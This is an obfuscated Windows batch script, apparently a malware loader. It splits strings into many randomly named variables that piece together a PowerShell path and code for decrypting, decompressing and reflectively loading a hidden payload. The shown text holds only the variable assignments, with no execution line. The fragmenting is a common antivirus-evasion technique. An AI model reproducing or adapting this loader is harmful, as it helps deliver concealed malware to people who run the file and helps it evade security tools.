@echo off
set "NDRoVshiuu=rS"
set "pbsRjlcEoY=xe"
set "eRIjKhDrff=\v"
set "fesOOCQssi=ow"
set "BKRkXxtOsy=Wi"
set "RthjuhKDyv=he"
set "emrFDMCaTF=s\"
set "xukRdJIlAs= C"
set "ZsJUGOqShc=co"
set "nRFFPiKJFH=rs"
set "DsxtbtEFgS=we"
set "NJyFnIsPWf=ll"
set "oQyvFGaOzt=:\"
set "LvFbyBDznq=Po"
set "asmppaKYym=po"
set "OCJDyZzFvr=we"
set "pdDsJWpOrg=\W"
set "soNXPebQZf=py"
set "zhXCowscwu=st"
set "zyfiaiMHAh=.e"
set "pWhZDdeman=0\"
set "nBCLFFhSQW=nd"
set "KwcWNWyNYk=ll"
set "lbtueDxdBy=ws"
set "JWKvhEliSV=y "
set "qTTbfNnMPZ=Sy"
set "uufTzvvAjr=1."
set "chYlGllqJb=32"
set "kOcHiQPIRS= /"
set "HawkuakXiS=em"
set "drqSeciPDy=he"
set "uADzXpxIHf=in"
set "CpEXXrjMWc=do"
set "iBJIVEBmwn= %~dp0"
set "hgqpkRaBxO=cd"
set "lPRGYrIOCt=pStr"
set "ExrlREKvkH=oint"
set "OlKgbORLdr=New-"
set "WzbPHTqCCJ=fi);"
set "LjXlHxKmlf=.Mem"
set "dHhNUUEwOW=;$Fs"
set "xHOUiyjARj=ode]"
set "nHABSQpKcB=m.IO"
set "gIATGBfOWS=ecry"
set "WmoKhHyoUN=ke($"
set "JYSNEiJfSY=gMod"
set "woXUFxZPtv=flec"
set "ZLbMZPwiHB=raph"
set "AiWUxdEaSF=JWhX"
set "frKbpeITgS=rity"
set "UcuoelRnLx=JIfi"
set "buqtErYann=O.Su"
set "OrRBkMGvGU=oArr"
set "bNElIzDxUS=ress"
set "BKFgYfUCaI= [Sy"
set "TjjSQPQaCZ=tS46"
set "tMYEXTmHdd=[Env"
set "MSagqWLmmC=raph"
set "hYIdZqqJhR=.Dis"
set "zRGdUXxpbw=Jx ="
set "ruerLxrNKe=.Cre"
set "JNeXxKHZwf=q = "
set "YIBsApguPA=;$Mh"
set "wRPTcwfZJC=Disp"
set "rPztxmFrwB=Conv"
set "BzMQkqwkxa=sion"
set "NATDKTWNPa=ose("
set "xZBdiyiwFR=S46e"
set "lZKIqMwvQy=[Sys"
set "SGUNiXKbnT=New-"
set "FmGfEPqSyG=m.Re"
set "iEkZRvhlgA=CFxo"
set "uZYQhPaWOC=in $"
set "iWUSylQwFH=$ZJI"
set "wEaPOnmCtL=teH "
set "RXYkPSRrfK=ect "
set "wsSDLRLdQd=yste"
set "XiaiXLUGpb= [st"
set "MPwlbSDLae=tem."
set "qmBhBPXUAr=ne);"
set "crCysLFddZ===')"
set "zKtzoQTxrl=);$Z"
set "BzEBhNnAyH=)))"
set "HrugmqNGkN=rofi"
set "nPZTIbYUjg=OJWh"
set "tQwTxNADgs=zHhH"
set "pcGKJhJfZm=);$S"
set "lmyuqSgxqn=$aty"
set "hulrbIvmor=and "
set "QPAxLFUKdv=grap"
set "MTMNFwVQug=KXPI"
set "Wbrzbyqvva=ose("
set "wSpTfObzjI=LClB"
set "bjpXFuZKcj=ress"
